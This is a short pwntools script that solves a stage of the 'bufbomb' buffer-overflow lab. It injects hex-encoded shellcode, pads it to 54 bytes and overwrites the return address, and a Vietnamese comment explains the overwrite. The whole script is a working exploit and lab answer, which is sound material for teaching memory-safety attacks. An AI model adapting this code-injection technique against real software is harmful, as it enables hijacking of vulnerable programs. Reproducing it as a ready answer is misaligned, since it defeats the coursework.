from pwn import * 
r = process(["./bufbomb", "-u", "059167235"])

payload = bytes.fromhex("c7 05 60 e1 ee 80 ef f9 6e 51 68 39 8c ee 80 c3").ljust(54, b"\0")
cmd = (payload + bytes.fromhex("55683a8e")[::-1]) # ghi de %ebp-50 vao return address
r.sendline(cmd)
r.interactive()